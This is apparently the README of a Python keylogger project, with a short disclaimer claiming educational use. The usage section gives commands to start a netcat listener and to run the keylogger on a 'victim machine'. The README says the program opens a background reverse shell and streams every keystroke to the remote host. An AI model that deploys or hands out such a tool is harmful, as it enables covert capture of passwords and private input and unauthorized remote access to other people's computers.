# Python Keylogger
Simple keylogger written in Python to capture the keystrokes of a user and output them into raw and readable text files. Work in progress.

<br><br>

# Disclaimer

### __Malicious use of this program is illegal.__

### This program is for educational purposes only and is not to be used for any malicious purposes. This includes downloading it on a computer that you do not own or using it on an unknowing individual.

### Upon downloading this, your antivirus software may detect it as malware and try to quarantine or delete it.

<br><br>

# Usage
Before running the keylogger on the victim machine, the listening host must run the command ```nc -lnvp <port>```.

Run the keylogger in a Windows machine with ```python3 keylog_win.py <hostname> <port>``` with ```<hostname>``` being the IP address of the listener machine. The program will run a reverse shell in the background of all tasks while capturing any keys that are pressed and sending them to the provided host.

The output of the logger will appear in the remote terminal when the user presses a character key.